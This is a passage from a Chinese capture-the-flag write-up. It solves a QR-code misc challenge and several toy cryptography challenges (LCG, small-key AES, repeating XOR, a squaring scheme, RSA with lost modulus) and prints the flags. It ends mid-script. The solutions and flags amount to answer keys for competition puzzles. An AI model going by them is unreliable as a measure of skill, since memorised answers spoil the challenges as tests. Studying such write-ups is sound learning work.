class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">65</span>, <span class="number">61</span>, <span class="number">61</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>10进制转字符串，base64解码得到：</p><p><code>0000000101110000000011111101110000000\n0111110101101010111110001110110111110\n0100010100001111000111010110110100010\n0100010110000011000111000001010100010\n0100010111011011001101101011110100010\n0111110101110100000001001000010111110\n0000000101010101010101010101010000000\n1111111100100000000100110011111111111\n1100010101010000101111110100000011000\n0101101000110010010000100110101011101\n1011000001001111001100011010000010010\n1110111111110010101101000110101011100\n1010110001110000000110100000000000010\n0110101001000100011011101011101111101\n0010100100111111101110000110010100010\n0010001101110110110011001100110011101\n1110100110001111111011010011000000010\n0000111010100011100000101101111110111\n1101100110101101001100010100110000100\n0101001001111001000001001110010010111\n0101010011000111000110010000010101000\n1001101111101110110010011111101011101\n1101100010111000000101110110001011010\n0011001000111101100011110100100111101\n0101000001110101110110101111110100010\n0101011011001001000000110100010011111\n0110100010001110010110011011111001100\n0111001111100000010110110111001111100\n0100110010110010100010111011000000000\n1111111101011001110011100101011101011\n0000000111000111011010110001010100100\n0111110111001101010110101100011101111\n0100010100110000110011010000000000010\n0100010101111101100011111111110100111\n0100010101101111111100000010101010110\n0111110111111000101101001111000110110\n0000000111111011110110000000100011000</code></p><p>37*37的01字符串，转为二维码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#xx27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">37</span>,<span class="number">37</span>))</span><br><span class="line">width , height = img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">37</span>*i+j]==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">img.putpixel((i,j),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">img.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">img.save(<span class="string">&#x27;out.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>扫码得flag：<code>flag&#123;932b2c0070e4897ea7df0190dbf36ece&#125;</code></p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="LinearEquations"><a href="#LinearEquations" class="headerlink" title="LinearEquations"></a>LinearEquations</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>:] == <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">flag = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag) == <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">my_LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed1 , seed2</span>):</span><br><span class="line">        self.state = [seed1,seed2]</span><br><span class="line">        self.n = getPrime(<span class="number">64</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            self.a = bytes_to_long(flag[:<span class="number">8</span>])</span><br><span class="line">            self.b = bytes_to_long(flag[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">            self.c = bytes_to_long(flag[<span class="number">16</span>:])</span><br><span class="line">            <span class="keyword">if</span> self.a &lt; self.n <span class="keyword">and</span> self.b &lt; self.n <span class="keyword">and</span> self.c &lt; self.n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        new = (self.a * self.state[-<span class="number">1</span>] + self.b * self.state[-<span class="number">2</span>] + self.c) % self.n</span><br><span class="line">        self.state.append( new )</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    lcg = my_LCG(getRandomInteger(<span class="number">64</span>),getRandomInteger(<span class="number">64</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;data = &quot;</span> + <span class="built_in">str</span>([lcg.<span class="built_in">next</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span> + <span class="built_in">str</span>(lcg.n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main() </span><br><span class="line"></span><br><span class="line"><span class="comment"># data = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]</span></span><br><span class="line"><span class="comment"># n = 10104483468358610819</span></span><br></pre></td></tr></table></figure></blockquote><p>魔改三参数LCG，利用满足的公式 $as_{i-1}+bs_{i-2}+c \equiv s_i \pmod n$，得到三元一次同余方程组，利用Gröbner基求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">d = [<span class="number">2626199569775466793</span>, <span class="number">8922951687182166500</span>, <span class="number">454458498974504742</span>, <span class="number">7289424376539417914</span>, <span class="number">8673638837300855396</span>]</span><br><span class="line">n = <span class="number">10104483468358610819</span></span><br><span class="line">PR.&lt;a,b,c&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f1 = (a*d[<span class="number">1</span>]+b*d[<span class="number">0</span>]+c-d[<span class="number">2</span>])</span><br><span class="line">f2 = (a*d[<span class="number">2</span>]+b*d[<span class="number">1</span>]+c-d[<span class="number">3</span>])</span><br><span class="line">f3 = (a*d[<span class="number">3</span>]+b*d[<span class="number">2</span>]+c-d[<span class="number">4</span>])</span><br><span class="line">Fs = [f1, f2, f3]</span><br><span class="line">I = Ideal(Fs)</span><br><span class="line">B = I.groebner_basis()</span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> B:</span><br><span class="line">    <span class="keyword">assert</span> b.degree() == <span class="number">1</span></span><br><span class="line">    mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    m += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(mi)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;L1near_Equ4t1on6_1s_34sy&#x27;</span></span><br></pre></td></tr></table></figure><p>拼接：<code>cazy&#123;L1near_Equ4t1on6_1s_34sy&#125;</code></p><p>​    </p><h3 id="no-can-no-bb"><a href="#no-can-no-bb" class="headerlink" title="no_can_no_bb"></a>no_can_no_bb</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] ==<span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">m</span>):</span><br><span class="line">    tmp = <span class="number">16</span>-(<span class="built_in">len</span>(m)%<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> m + <span class="built_in">bytes</span>([tmp <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(tmp)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m,key</span>):</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = pad(flag)</span><br><span class="line">    key = pad(long_to_bytes(random.randrange(<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">20</span>)))</span><br><span class="line">    c = encrypt(flag,key)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># b&#x27;\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>random范围不大，爆破key解AES-ECB：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    tmp = <span class="number">16</span>-(<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> x + <span class="built_in">bytes</span>([tmp <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(tmp)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c,key</span>):</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.decrypt(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>&lt;&lt;<span class="number">20</span>):</span><br><span class="line">        key = pad(long_to_bytes(i))</span><br><span class="line">        c = <span class="string">b&#x27;\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#x27;</span></span><br><span class="line">        m = decrypt(c,key)</span><br><span class="line">        <span class="keyword">if</span> m.startswith(<span class="string">b&#x27;cazy&#123;&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            </span><br><span class="line"><span class="comment"># b&#x27;cazy&#123;n0_c4n,bb?n0p3!&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="no-cry-no-can"><a href="#no-cry-no-can" class="headerlink" title="no_cry_no_can"></a>no_cry_no_can</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(key) &lt;= <span class="number">5</span></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">can_encrypt</span>(<span class="params">flag,key</span>):</span><br><span class="line">    block_len = <span class="built_in">len</span>(flag) // <span class="built_in">len</span>(key) + <span class="number">1</span></span><br><span class="line">    new_key = key * block_len</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(flag,new_key)])</span><br><span class="line"></span><br><span class="line">c = can_encrypt(flag,key)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;&lt;pH\x86\x1a&amp;&quot;m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>key为5位，已知flag头5位，与密文异或得<code>key = b&#39;\x5f\x11\x32\xff\x61&#39;</code>，再异或密文还原明文：</p><p><code>cazy&#123;y3_1s_a_h4nds0me_b0y!&#125;</code></p><p>​    </p><h3 id="no-math-no-cry"><a href="#no-math-no-cry" class="headerlink" title="no_math_no_cry"></a>no_math_no_cry</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">80</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sec_encry</span>(<span class="params">m</span>):</span><br><span class="line">    cip = (m - (<span class="number">1</span>&lt;&lt;<span class="number">500</span>))**<span class="number">2</span> + <span class="number">0x0338470</span></span><br><span class="line">    <span class="keyword">return</span> cip</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = sec_encry(m)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>简单逆回去就好，注意一下开方取负值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169</span></span><br><span class="line">c -= <span class="number">0x0338470</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">m = -gmpy2.iroot(c,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m+(<span class="number">1</span>&lt;&lt;<span class="number">500</span>))[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;cazy&#123;1234567890_no_m4th_n0_cRy&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><blockquote><p>数学最重要的就是推导</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pinvq:<span class="number">0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3</span></span><br><span class="line">qinvp:<span class="number">0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b</span></span><br><span class="line">c:<span class="number">0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386</span></span><br><span class="line">e:<span class="number">0x10005</span></span><br><span class="line">d:<span class="number">0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1</span></span><br></pre></td></tr></table></figure></blockquote><p>给出 $x=\text{inv}(p,q),y=\text{inv}(q,p),e,d,c$。</p><p>详细推导思路可参考 <a href="https://github.com/pcw109550/write-up/tree/master/2019/HITCON/Lost_Modulus_Again">HITCON 2019 - Lost Modulus Again</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">alpha = p&#x27; * q&#x27; - l</span></span><br><span class="line"><span class="string">beta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2</span></span><br><span class="line"><span class="string">i.e.:</span></span><br><span class="line"><span class="string">beta = l^2 * &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;</span></span><br><span class="line"><span class="string">if l,s are correct:</span></span><br><span class="line"><span class="string">    alpha = k * t</span></span><br><span class="line"><span class="string">    beta = k * (p&#x27; - l) + t * (q&#x27; - l)</span></span><br><span class="line"><span class="string">i.e:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alpha_from_pprime_qprime_l</span>(<span class="params">pprime, qprime, l</span>):</span><br><span class="line">    <span class="keyword">return</span> pprime*qprime - l</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">beta_from_pprime_qprime_e_d_l_s_alpha</span>(<span class="params">pprime, qprime, e, d, l, s, alpha</span>):</span><br><span class="line">    temp1 = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> temp1 % s == <span class="number">0</span></span><br><span class="line">    temp2 = ((temp1 // s) - <span class="number">1</span>) * l * l</span><br><span class="line">    temp3 = temp2 + l * (pprime + qprime)</span><br><span class="line">    <span class="keyword">return</span> temp3 - alpha - (pprime*qprime)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">k_t_from_pprime_qprime_l_alpha_beta</span>(<span class="params">pprime, qprime, l, alpha, beta</span>):</span><br><span class="line">    a = pprime - l</span><br><span class="line">    b = -beta</span><br><span class="line">    c = alpha * (qprime - l)</span><br><span class="line">    disc = b * b - <span class="number">4</span> * a * c</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_square(disc)</span><br><span class="line">    temp = -b + gmpy2.isqrt(disc)</span><br><span class="line">    <span class="keyword">assert</span> temp % (<span class="number">2</span>*a) == <span class="number">0</span></span><br><span class="line">    k = temp // (<span class="number">2</span>*a) </span><br><span class="line">    <span class="keyword">assert</span> alpha % k == <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> k, alpha // k</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_k_t_l</span>(<span class="params">pprime, qprime, e, d</span>):</span><br><span class="line">    </span><br><span class="line">   <span class="comment"># l, s = 2, 2</span></span><br><span class="line"></span><br><span class="line">    ss = [s <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(e - <span class="number">100000</span>, e + <span class="number">1000000</span>) <span class="keyword">if</span> s!=<span class="number">0</span> <span class="keyword">and</span> (e*d - <span class="number">1</span>) % s == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> l, s <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5000</span>), ss):</span><br><span class="line">        <span class="comment">#print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            alpha = alpha_from_pprime_qprime_l(pprime, qprime, l)</span><br><span class="line">            beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha)</span><br><span class="line">            k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta)</span><br><span class="line">            <span class="keyword">return</span> k, t, l</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> AssertionError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    e = <span class="number">0x10005</span></span><br><span class="line">    <span class="comment">#fn = 